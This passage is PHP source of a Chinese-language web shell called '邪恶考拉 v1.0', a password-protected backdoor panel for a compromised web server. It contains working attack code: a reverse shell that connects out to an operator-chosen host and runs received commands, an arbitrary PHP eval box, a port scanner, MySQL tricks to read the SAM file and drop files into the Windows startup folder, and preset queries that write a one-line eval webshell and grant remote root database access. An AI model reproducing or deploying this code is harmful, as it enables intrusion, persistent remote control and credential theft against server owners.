<div class="actall">端口：<input type="text" name="port" value="{$Port_port}" style="width:597px;"></div>
<div class="actall"><input type="submit" value="扫描" style="width:80px;"></div>
</form>
END;
	if((!empty($_POST['ip'])) && (!empty($_POST['port']))){
		echo '<div class="actall">';
		$ports = explode('|', $_POST['port']);
		for($i = 0;$i < count($ports);$i++){
			$errno;
			$errstr;
			$fp = @fsockopen($_POST['ip'],$ports[$i],$errno,$errstr,2);
			echo $fp ? '<font color="#FF0000">端口 '.$ports[$i].' 开放</font><br>' : '端口 '.$ports[$i].' 关闭<br>';
			ob_flush();
			flush();
		}
		echo '</div>';
	}
	return true;
}


/**
 * 反弹连接函数
 */
function reflectSocket(){
	@set_time_limit(0);
	$system=strtoupper(substr(PHP_OS, 0, 3));
if(!extension_loaded('sockets')){
	if ($system == 'WIN') {
		@dl('php_sockets.dll') or die("无法加载php_sockets.dll模块");
	}else{
		@dl('sockets.so') or die("无法加载sockets.so模块");
	}
}
if(isset($_POST['host']) && isset($_POST['port'])){
	$host = $_POST['host'];
	$port = $_POST['port'];
}else{	
print<<<eof

<form method=post action="?s=reflect">
<div class="actall">主机：<input type=text name=host value=""><br>端口：<input type=text name=port value="1120"><br><br>
服务器类型：<input type="radio" name=info value="linux" checked>Linux <input type="radio" name=info value="win">Windows <input class="bt" type=submit name=submit value="连接" style="width:80px;">
</form>
eof;
}
if($system=="WIN"){
	$env=array('path' => 'c:\\windows\\system32');
}else{
	$env = array('PATH' => '/bin:/usr/bin:/usr/local/bin:/usr/local/sbin:/usr/sbin');
}
$descriptorspec = array(
	0 => array("pipe","r"),
	1 => array("pipe","w"),
	2 => array("pipe","w"),
);
$host=gethostbyname($host);
$proto=getprotobyname("tcp");
if(($sock=socket_create(AF_INET,SOCK_STREAM,$proto))<0){
	die("Socket创建失败");
}
if(($ret=socket_connect($sock,$host,$port))<0){
	die("连接失败");
}else{
	$message="----------------------PHP反弹连接--------------------\n";
	socket_write($sock,$message,strlen($message));
	$cwd=str_replace('\\','/',dirname(__FILE__));
	while($cmd=socket_read($sock,65535,$proto)){
		if(trim(strtolower($cmd))=="exit"){
			socket_write($sock,"Bye\n");
			exit;
		}else{
			$process = proc_open($cmd, $descriptorspec, $pipes, $cwd, $env);
			if (is_resource($process)) {
				fwrite($pipes[0], $cmd);
				fclose($pipes[0]);
				$msg=stream_get_contents($pipes[1]);
				socket_write($sock,$msg,strlen($msg));
				fclose($pipes[1]);
				$msg=stream_get_contents($pipes[2]);
				socket_write($sock,$msg,strlen($msg));
				$return_value = proc_close($process);
			}
		}
	}
}
}


/**
 * 执行php代码
 */
function evalCode(){
print<<<END
<h5>php代码:<h5>
<form action="?s=eval" method="POST">
<div class="actall"><textarea name="phpcode" rows="20" cols="80">phpinfo();</textarea></div><br />
<div><input class="bt" type="submit" value="执行代码" style="width:88px;"></div><br></form>
END;
$phpcode = $_POST['phpcode'];
$phpcode = trim($phpcode);
if($phpcode){
	if (!preg_match('#<\?#si',$phpcode)){
		$phpcode = "<?php\n\n{$phpcode}\n\n?>";
	}
	eval("?".">$phpcode<?");
	echo '<br><br>';
}
return false;
}


/**
 * 执行mysql命令函数
 */
function mysqlCmd(){
	$MSG_BOX = '';
	$mhost = 'localhost'; $muser = 'root'; $mport = '3306'; $mpass = ''; $mdata = 'mysql'; $msql = 'select version();';
	if(isset($_POST['mhost']) && isset($_POST['muser'])){
		$mhost = $_POST['mhost']; $muser = $_POST['muser']; $mpass = $_POST['mpass']; $mdata = $_POST['mdata']; $mport = $_POST['mport'];
		if($conn = mysql_connect($mhost.':'.$mport,$muser,$mpass)) @mysql_select_db($mdata);
		else $MSG_BOX = '连接MYSQL失败';
	}
	$downfile = 'c:/windows/repair/sam';
	if(!empty($_POST['downfile'])){
		$downfile = fileStrReplace($_POST['downfile']);
		$binpath = bin2hex($downfile);
		$query = 'select load_file(0x'.$binpath.')';
		if($result = @mysql_query($query,$conn)){
			$k = 0; $downcode = '';
			while($row = @mysql_fetch_array($result)){
				$downcode .= $row[$k];$k++;
			}
			$filedown = basename($downfile);
			if(!$filedown) $filedown = 'spider.tmp';
			$array = explode('.', $filedown);
			$arrayend = array_pop($array);
			header('Content-type: application/x-'.$arrayend);
			header('Content-Disposition: attachment; filename='.$filedown);
			header('Content-Length: '.strlen($downcode));
			echo $downcode;
			exit;
		}
		else $MSG_BOX = '下载文件失败';
	}
	$o = isset($_GET['o']) ? $_GET['o'] : '';
	mainCSS();
print<<<END
<form method="POST" name="nform" id="nform" action="?s=n&o={$o}" enctype="multipart/form-data">
<center><div class="actall"><a href="?s=n">Mysql执行语句</a>&nbsp;&nbsp;&nbsp;&nbsp;
<a href="?s=n&o=u">Mysql上传文件</a>&nbsp;&nbsp;&nbsp;&nbsp;
<a href="?s=n&o=d">Mysql下载文件</a></div>
<div class="actall">
连接地址：<input type="text" name="mhost" value="{$mhost}" style="width:110px">
连接端口：<input type="text" name="mport" value="{$mport}" style="width:110px">
用户名：<input type="text" name="muser" value="{$muser}" style="width:110px">
密码：<input type="text" name="mpass" value="{$mpass}" style="width:110px">
数据库名：<input type="text" name="mdata" value="{$mdata}" style="width:110px">
</div>
<div class="actall" style="height:220px;">
END;
if($o == 'u'){
	$uppath = 'C:/Documents and Settings/All Users/「开始」菜单/程序/启动/xx.vbs';
	if(!empty($_POST['uppath']))
	{
		$uppath = $_POST['uppath'];
		$query = 'Create TABLE a (cmd text NOT NULL);';
		if(@mysql_query($query,$conn))
		{
			if($tmpcode = fileRead($_FILES['upfile']['tmp_name'])){
				$filecode = bin2hex(fileRead($tmpcode));
			}
			else{
				$tmp = fileStrReplace(dirname(__FILE__)).'/upfile.tmp';
				if(fileMove($_FILES['upfile']['tmp_name'],$tmp)){
					$filecode = bin2hex(fileRead($tmp));
					@unlink($tmp);
				}
			}
			$query = 'Insert INTO a (cmd) VALUES(CONVERT(0x'.$filecode.',CHAR));';
			if(@mysql_query($query,$conn)){
				$query = 'SELECT cmd FROM a INTO DUMPFILE \''.$uppath.'\';';
				$MSG_BOX = @mysql_query($query,$conn) ? '上传文件成功' : '上传文件失败';
			}
			else $MSG_BOX = '插入临时表失败';
			@mysql_query('Drop TABLE IF EXISTS a;',$conn);
		}
		else $MSG_BOX = '创建临时表失败';
	}
print<<<END
<br><br>上传路径：<input type="text" name="uppath" value="{$uppath}" style="width:500px">
<br><br>选择文件：<input type="file" name="upfile" style="width:500px;height:22px;">
</div><div class="actall"><input type="submit" value="上传" style="width:80px;">
END;
}
elseif($o == 'd'){
print<<<END
<br><br><br>下载文件：<input type="text" name="downfile" value="{$downfile}" style="width:500px">
</div><div class="actall"><input type="submit" value="下载" style="width:80px;">
END;
}
else{
	if(!empty($_POST['msql'])){
		$msql = $_POST['msql'];
		if($result = @mysql_query($msql,$conn)){
			$MSG_BOX = 'SQL语句执行成功：<br>';
			$k = 0;
			while($row = @mysql_fetch_array($result)){
				$MSG_BOX .= $row[$k];$k++;
			}
		}
		else $MSG_BOX .= mysql_error();
	}
print<<<END
<script language="javascript">
function nFull(i){
	Str = new Array(11);
	Str[0] = "select version();";
	Str[1] = "select load_file(0x633A5C5C626F6F742E696E69) FROM user into outfile 'C://xx.txt'";
	Str[2] = "select '<?php eval(\$_POST[cmd]);?>' into outfile 'C://a.php';";
	Str[3] = "GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123456' WITH GRANT OPTION;";
	nform.msql.value = Str[i];
	return true;
}
</script>
<br>
<textarea name="msql" style="width:700px;height:200px;">{$msql}</textarea>
</div>
<div >
<select onchange="return nFull(options[selectedIndex].value)">
	<option value="0" selected>显示版本</option>
	<option value="1">导出文件</option>
	<option value="2">写入文件</option>
	<option value="3">开启外连</option>
</select>
<input type="submit" value="执行" style="width:80px;">
END;
}
	if($MSG_BOX != '') echo '</div><br><div class="actall">'.$MSG_BOX.'</div></center></form>';
	else echo '</div></center></form>';
	return true;
}



function Mysql_Len($data,$len){
	if(strlen($data) < $len) return $data;
	return substr_replace($data,'...',$len);
}


function mysqlManageDo(){
	$conn = @mysql_connect($_COOKIE['m_spiderhost'].':'.$_COOKIE['m_spiderport'],$_COOKIE['m_spideruser'],$_COOKIE['m_spiderpass']);
	if($conn){
print<<<END
<script language="javascript">
function Delok(msg,gourl)
{
	smsg = "确定要删除[" + unescape(msg) + "]吗?";
	if(confirm(smsg)){window.location = gourl;}
}
function Createok(ac)
{
	if(ac == 'a') document.getElementById('nsql').value = 'CREATE TABLE name (spider BLOB);';
	if(ac == 'b') document.getElementById('nsql').value = 'CREATE DATABASE name;';
	if(ac == 'c') document.getElementById('nsql').value = 'DROP DATABASE name;';
	return false;
}
</script>
END;
		$BOOL = false;
		$MSG_BOX = '用户:'.$_COOKIE['m_spideruser'].' &nbsp;&nbsp;&nbsp;&nbsp; 地址:'.$_COOKIE['m_spiderhost'].':'.$_COOKIE['m_spiderport'].' &nbsp;&nbsp;&nbsp;&nbsp; 版本:';
		$k = 0;
		$result = @mysql_query('select version();',$conn);
		while($row = @mysql_fetch_array($result)){
			$MSG_BOX .= $row[$k];$k++;
		}
		echo '<div class="actall"> 数据库:<br>';
		$result = mysql_query("SHOW DATABASES",$conn);
		while($db = mysql_fetch_array($result)){
			echo '<a href="?s=r&db='.$db['Database'].'">'.$db['Database'].'</a>&nbsp;&nbsp;';
		}
		echo '</div>';
		if(isset($_GET['db'])){
			mysql_select_db($_GET['db'],$conn);
			if(!empty($_POST['nsql'])){
				$BOOL = true; 
				$MSG_BOX = mysql_query($_POST['nsql'],$conn) ? '执行成功' : '执行失败 '.mysql_error();
			}
			if(is_array($_POST['insql'])){
				$query = 'INSERT INTO '.$_GET['table'].' (';
				foreach($_POST['insql'] as $var => $key){
					$querya .= $var.',';
					$queryb .= '\''.addslashes($key).'\',';
				}
				$query = $query.substr($querya, 0, -1).') VALUES ('.substr($queryb, 0, -1).');';
				$MSG_BOX = mysql_query($query,$conn) ? '添加成功' : '添加失败 '.mysql_error();
			}
			if(is_array($_POST['upsql'])){
				$query = 'UPDATE '.$_GET['table'].' SET ';
				foreach($_POST['upsql'] as $var => $key){
					$queryb .= $var.'=\''.addslashes($key).'\',';
				}
				$query = $query.substr($queryb, 0, -1).' '.base64_decode($_POST['wherevar']).';';
				$MSG_BOX = mysql_query($query,$conn) ? '修改成功' : '修改失败 '.mysql_error();
			}
			if(isset($_GET['del'])){
				$result = mysql_query('SELECT * FROM '.$_GET['table'].' LIMIT '.$_GET['del'].', 1;',$conn);
				$good = mysql_fetch_assoc($result);
				$query = 'DELETE FROM '.$_GET['table'].' WHERE ';
				foreach($good as $var => $key){
					$queryc .= $var.'=\''.addslashes($key).'\' AND ';
				}
				$where = $query.substr($queryc, 0, -4).';';
				$MSG_BOX = mysql_query($where,$conn) ? '删除成功' : '删除失败 '.mysql_error();
			}
			$action = '?s=r&db='.$_GET['db'];
			if(isset($_GET['drop'])){$query = 'Drop TABLE IF EXISTS '.$_GET['drop'].';';$MSG_BOX = mysql_query($query,$conn) ? '删除成功' : '删除失败 '.mysql_error();}
			if(isset($_GET['table'])){$action .= '&table='.$_GET['table'];if(isset($_GET['edit'])) $action .= '&edit='.$_GET['edit'];}
			if(isset($_GET['insert'])) $action .= '&insert='.$_GET['insert'];
			echo '<div class="actall"><form method="POST" action="'.$action.'">';
			echo '<textarea name="nsql" id="nsql" style="width:500px;height:50px;">'.$_POST['nsql'].'</textarea> ';
			echo '<input type="submit" name="querysql" value="执行SQL" style="width:60px;height:49px;"> ';
			echo '<input type="button" value="新建表" style="width:60px;height:49px;" onclick="Createok(\'a\')"> ';
			echo '<input type="button" value="新建库" style="width:60px;height:49px;" onclick="Createok(\'b\')"> ';
			echo '<input type="button" value="删除库" style="width:60px;height:49px;" onclick="Createok(\'c\')"></form></div>';
			echo '<div class="msgbox" style="height:25px;">'.$MSG_BOX.'</div><div class="actall"><a href="?s=r&db='.$_GET['db'].'">'.$_GET['db'].'</a> ---> ';
			if(isset($_GET['table'])){
				echo '<a href="?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'">'.$_GET['table'].'</a> ';
				echo '[<a href="?s=r&db='.$_GET['db'].'&insert='.$_GET['table'].'">插入记录</a>]</div>';
				if(isset($_GET['edit'])){
					if(isset($_GET['p'])) $atable = $_GET['table'].'&p='.$_GET['p']; else $atable = $_GET['table'];
					echo '<form method="POST" action="?s=r&db='.$_GET['db'].'&table='.$atable.'">';
					$result = mysql_query('SELECT * FROM '.$_GET['table'].' LIMIT '.$_GET['edit'].', 1;',$conn);
					$good = mysql_fetch_assoc($result);
					$u = 0;
					foreach($good as $var => $key){
						$queryc .= $var.'=\''.$key.'\' AND ';
						$type = @mysql_field_type($result, $u);
						$len = @mysql_field_len($result, $u);
						echo '<div class="actall">'.$var.' <font color="#FF0000">'.$type.'('.$len.')</font><br><textarea name="upsql['.$var.']" style="width:600px;height:60px;">'.htmlspecialchars($key).'</textarea></div>';
						$u++;
					}
					$where = 'WHERE '.substr($queryc, 0, -4);
					echo '<input type="hidden" id="wherevar" name="wherevar" value="'.base64_encode($where).'">';
					echo '<div class="actall"><input type="submit" value="Update" style="width:80px;"></div></form>';
				}
				else{
					$query = 'SHOW COLUMNS FROM '.$_GET['table'];
					$result = mysql_query($query,$conn);
					$fields = array();
					$row_num = mysql_num_rows(mysql_query('SELECT * FROM '.$_GET['table'],$conn));
					if(!isset($_GET['p'])){
						$p = 0;$_GET['p'] = 1;
					} else $p = ((int)$_GET['p']-1)*20;
					echo '<table border="0"><tr>';
					echo '<td class="toptd" style="width:70px;" nowrap>操作</td>';
					while($row = @mysql_fetch_assoc($result)){
						array_push($fields,$row['Field']);
						echo '<td class="toptd" nowrap>'.$row['Field'].'</td>';
					}
					echo '</tr>';
					if(eregi('WHERE|LIMIT',$_POST['nsql']) && eregi('SELECT|FROM',$_POST['nsql'])) $query = $_POST['nsql']; else $query = 'SELECT * FROM '.$_GET['table'].' LIMIT '.$p.', 20;';
					$result = mysql_query($query,$conn);
					$v = $p;
					while($text = @mysql_fetch_assoc($result)){
						echo '<tr><td><a href="?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&edit='.$v.'"> 修改 </a> ';
						echo '<a href="#" onclick="Delok(\'它\',\'?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$_GET['p'].'&del='.$v.'\');return false;"> 删除 </a></td>';
						foreach($fields as $row){echo '<td>'.nl2br(htmlspecialchars(Mysql_Len($text[$row],500))).'</td>';}
						echo '</tr>'."\r\n";$v++;
					}
					echo '</table><div class="actall">';
					for($i = 1;$i <= ceil($row_num / 20);$i++){
						$k = ((int)$_GET['p'] == $i) ? '<font color="#FF0000">'.$i.'</font>' : $i;echo '<a href="?s=r&db='.$_GET['db'].'&table='.$_GET['table'].'&p='.$i.'">['.$k.']</a> ';
					}
					echo '</div>';
				}
			}
			elseif(isset($_GET['insert'])){
				echo '<a href="?s=r&db='.$_GET['db'].'&table='.$_GET['insert'].'">'.$_GET['insert'].'</a></div>';
				$result = mysql_query('SELECT * FROM '.$_GET['insert'],$conn);
				$fieldnum = @mysql_num_fields($result);
				echo '<form method="POST" action="?s=r&db='.$_GET['db'].'&table='.$_GET['insert'].'">';
				for($i = 0;$i < $fieldnum;$i++){
					$name = @mysql_field_name($result, $i);
					$type = @mysql_field_type($result, $i);
					$len = @mysql_field_len($result, $i);
					echo '<div class="actall">'.$name.' <font color="#FF0000">'.$type.'('.$len.')</font><br><textarea name="insql['.$name.']" style="width:600px;height:60px;"></textarea></div>';
				}
				echo '<div class="actall"><input type="submit" value="插入" style="width:80px;"></div></form>';
			}
			else{
				$query = 'SHOW TABLE STATUS';
				$status = @mysql_query($query,$conn);
				while($statu = @mysql_fetch_array($status)){
					$statusize[] = $statu['Data_length'];
					$statucoll[] = $statu['Collation'];
				}
				$query = 'SHOW TABLES FROM '.$_GET['db'].';';
				echo '</div><table border="0"><tr>';
				echo '<td class="toptd" style="width:550px;"> 表名 </td>';
				echo '<td class="toptd" style="width:80px;"> 操作 </td>';
				echo '<td class="toptd" style="width:130px;"> 字符集 </td>';
				echo '<td class="toptd" style="width:70px;"> 大小 </td></tr>';
				$result = @mysql_query($query,$conn);
				$k = 0;
				while($table = mysql_fetch_row($result)){
					echo '<tr><td><a href="?s=r&db='.$_GET['db'].'&table='.$table[0].'">'.$table[0].'</a></td>';
					echo '<td><a href="?s=r&db='.$_GET['db'].'&insert='.$table[0].'"> 插入 </a> <a href="#" onclick="Delok(\''.$table[0].'\',\'?s=r&db='.$_GET['db'].'&drop='.$table[0].'\');return false;"> 删除 </a></td>';
					echo '<td>'.$statucoll[$k].'</td><td align="right">'.getFileSize($statusize[$k]).'</td></tr>'."\r\n";
					$k++;
				}
				echo '</table>';
			}
		}
	}
	else die('连接MYSQL失败,请重新登陆.<meta http-equiv="refresh" content="0;URL=?s=o">');
	if(!$BOOL) echo '<script type="text/javascript">document.getElementById(\'nsql\').value = \''.addslashes($query).'\';</script>';
	return false;
}


/**
 * mysql管理函数
 */
function mysqlManage(){
	ob_start();
	if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass'])){
		if(@mysql_connect($_POST['mhost'].':'.$_POST['mport'],$_POST['muser'],$_POST['mpass'])){
			$cookietime = time() + 24 * 3600;
			setcookie('m_spiderhost',$_POST['mhost'],$cookietime);
			setcookie('m_spiderport',$_POST['mport'],$cookietime);
			setcookie('m_spideruser',$_POST['muser'],$cookietime);
			setcookie('m_spiderpass',$_POST['mpass'],$cookietime);
			die('正在登陆...<meta http-equiv="refresh" content="0;URL=?s=r">');
		}
	}
print<<<END
<form method="POST" name="oform" id="oform" action="?s=o">
<div class="actall">数据库地址：<input type="text" name="mhost" value="localhost" style="width:300px"></div>
<div class="actall">数据库端口：<input type="text" name="mport" value="3306" style="width:300px"></div>
<div class="actall">用&nbsp;&nbsp;户&nbsp;&nbsp;名：&nbsp;<input type="text" name="muser" value="root" style="width:300px"></div>
<div class="actall">密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;码：&nbsp;<input type="text" name="mpass" value="" style="width:300px"></div>
<div class="actall"><input type="submit" value="登陆" style="width:80px;"> <input type="button" value="用COOKIE登陆" style="width:120px;" onclick="window.location='?s=r';"></div>
</form>
END;
	ob_end_flush();
	return true;
}


/**
 * css样式函数
 */
function mainCSS(){
print<<<END
<style type="text/css">
*{padding:0; margin:0;}
body{background:FFFFFF;font-family:"Verdana","Tahoma","宋体",sans-serif;font-size:13px;margin-top:3px;margin-bottom:3px;table-layout:fixed;word-break:break-all;}
a{color:#000000;text-decoration:none;}
a:hover{color:#FFFFFF;background:#57864e;}
table{color:#000000;font-family:"Verdana","Tahoma","宋体",sans-serif;font-size:13px;border-color:#cdcdcd;border-style:solid;border-width: 1px;}
td{background:#FFFFFF;border-top-width: 0px;border-right-width: 1px;border-bottom-width: 1px;border-left-width: 0px;border-style:solid;border-top-color: #cdcdcd;border-right-color: #cdcdcd;border-bottom-color: #cdcdcd;border-left-color: #cdcdcd;}
.toptd{color:#FFFFFF;background:#57864e;width:310px;border-color:#cdcdcd;border-style:solid;border-width:1px;}
.toptd a{color:#FFFFFF;}
.toptd a:hover{color:#57864e;background:#FFFFFF;}
.msgbox{background:#FFFFE0;color:#866e43;height:25px;font-size:12px;border:1px solid #999999;text-align:center;padding-top:5px;clear:both;}
.actall{background:#FFFFFF;font-size:14px;border:1px solid #cdcdcd;padding:2px;margin-top:3px;margin-bottom:3px;clear:both;}
</style>\n
END;
return false;
}


/**
 * 登陆函数
 */
function loginMain($MSG_TOP){
print<<<END
<html>
	<body style="background:#f5f5f5;">
		<center>
		<form method="POST">
		<div style="width:351px;height:201px;margin-top:100px;background:#ffffff;border-color:#cdcdcd #cdcdcd #cdcdcd #cdcdcd;border-style:solid;border-width:1px;">
		<div style="width:350px;height:22px;padding-top:2px;color:#FFFFFF;background:#57864e;clear:both;"><b>{$MSG_TOP}</b></div>
		<div style="width:350px;height:80px;margin-top:50px;color:#000000;clear:both;">密码:<input type="password" name="spiderpass"  style="width:270px;"></div>
		<div style="width:350px;height:30px;clear:both;"><input type="submit" value="登陆" style="width:80px;"></div>
		</div>
		</form>
		</center>
	</body>
</html>
END;
return false;
}


/**
 * 主页面函数
 */
function MainWindow(){
	$Server_IP = gethostbyname($_SERVER["SERVER_NAME"]);
	$Server_OS = PHP_OS;
	$Server_Soft = $_SERVER["SERVER_SOFTWARE"];
	$Server_Alexa = 'http://cn.alexa.com/siteinfo/'.str_replace('www.','',$_SERVER['SERVER_NAME']);
print<<<END
<html><head><title>邪恶考拉 v1.0</title>
<style type="text/css">
*{padding:0; margin:0;}
body{background:#f5f5f5;font-family:"Verdana", "Tahoma", "宋体",sans-serif; font-size:13px; text-align:center;margin-top:5px;word-break:break-all;}
a{color:#FFFFFF;text-decoration:none;}
a:hover{background:#FFFFFF;}
.outtable{margin: 0 auto;padding-right:9px;height:650px;width:955px;color:#000000;border-top-width: 1px;border-right-width: 1px;border-bottom-width: 1px;border-left-width: 1px;border-style:solid;border-top-color: #cdcdcd;border-right-color: #cdcdcd;border-bottom-color: #cdcdcd;border-left-color: #cdcdcd;background-color: #FFFFFF;}<!--中间背景-->
.topbg{padding-top:3px;font-size:29px;font-weight: bold;height:22px;width:950px;color:#57864e;background: #b6d7a8;}
.topbg a{color:#274e13;text-decoration:none;}
.topbg a:hover{color:#57864e;}
.bottombg{padding-top:10px;text-align: center;font-size:12px;font-weight: bold;height:22px;width:950px;color:#57864e;background: #FFFFFF;}
.listbg a{padding-top:4px;padding-bottom:4px;padding-left:8px;padding-right:8px;background:#FFFFFF;color:#57864e;font-size:14px;border-color:#cdcdcd #cdcdcd #cdcdcd #cdcdcd;border-style:solid;border-width:1px;text-decoration:none;font-weight:bold;}
</style>
<script language="JavaScript">
function switchTab(tabid)
{
if(tabid == '') return false;
for(var i=0;i<=12;i++)
{
	if(tabid == 't_'+i) {document.getElementById(tabid).style.background="#57864e";
	document.getElementById(tabid).style.color="#ffffff";}
	else {document.getElementById('t_'+i).style.background="#FFFFFF";
	document.getElementById('t_'+i).style.color="#57864e";}
}
return true;
}
</script>
</head>
<body>
<div class="outtable">
<div style="color:#000000;font-size:14px;margin-left:3px;margin-top:3px;margin-bottom:3px" align="left">&nbsp;{$Server_IP}&nbsp;&nbsp;{$Server_OS}&nbsp;&nbsp;{$Server_Soft}
</div>
<div class="listbg" style="margin-top:15px;">
<a href="?s=sysinfo" id="t_0" onclick="switchTab('t_0')" target="main" style="background:#57864e;color:FFFFFF" >服务器信息</a>
<a href="?s=a" id="t_1" onclick="switchTab('t_1')"  target="main">文件系统</a>
<a href="?s=searchfile" id="t_2" onclick="switchTab('t_2')" target="main">搜索文件</a>
<a href="?s=n" id="t_3" onclick="switchTab('t_3')" target="main">Mysql命令</a>
<a href="?s=o" id="t_4" onclick="switchTab('t_4')" target="main">Mysql管理</a>
<a href="?s=execmd" id="t_5" onclick="switchTab('t_5')" target="main">系统命令</a>
<a href="?s=scanport" id="t_6" onclick="switchTab('t_6')" target="main">扫描端口</a>
<a href="?s=reflect" id="t_7" onclick="switchTab('t_7')" target="main">反弹连接</a>
<a href="?s=eval" id="t_8" onclick="switchTab('t_8')" target="main">执行php代码</a>
<a href="?s=logout" id="t_9" onclick="switchTab('t_9')">退出</a>
</div>
<br>
	<div style="height:546px;">
		<table width="100%" height="100%" border=0 cellpadding="0" cellspacing="0">
		<tr><td width="10" align="center" valign="top">
</td><td>
<iframe name="main" src="?s=sysinfo" width="100%" height="100%" frameborder="0"></iframe></td></tr></table></div>
<div class="bottombg">邪恶考拉 v1.0 作者:magicming</div></div><br></body></html>
END;
return false;
}

if(get_magic_quotes_gpc()){
	$_GET = getRoot($_GET);
	$_POST = getRoot($_POST);
}
if($_GET['s'] == 'logout'){
	setcookie('admin_spiderpass',NULL);
	die('<meta http-equiv="refresh" content="0;URL=?">');
}
if($_COOKIE['admin_spiderpass'] != md5($password)){
	ob_start();
	$MSG_TOP = '邪恶考拉 v1.0';
	if(isset($_POST['spiderpass'])){
		$cookietime = time() + 24 * 3600;
		setcookie('admin_spiderpass',md5($_POST['spiderpass']),$cookietime);
		if(md5($_POST['spiderpass']) == md5($password)){die('<meta http-equiv="refresh" content="1;URL=?">');}
		else{$MSG_TOP = '密码错误';}
	}
loginMain($MSG_TOP);
ob_end_flush();
exit;
}
if(isset($_GET['s'])){
	$s = $_GET['s'];if($s != 'a' && $s != 'n')mainCSS();
}else{
	$s = 'MyNameIsHfacker';
}
$p = isset($_GET['p']) ? $_GET['p'] : fileStrReplace(dirname(__FILE__));
switch($s){
	case"sysinfo":sysInfo();break;
	case"a":fileManage($p);break;
	case"p":fileEdit($_GET['fp'],$_GET['fn']); break;
	case"q":fileUpload($p); break;
	case"searchfile":searchFile();break;
	case"n":mysqlCmd();break;
	case"o":mysqlManage();break;
	case"r":MysqlManageDo(); break;
	case"execmd":exeCmd();break;
	case"scanport":scanPort();break;
	case"reflect":reflectSocket();break;
	case"eval":evalCode();break;
	default:MainWindow();break;
}
?>
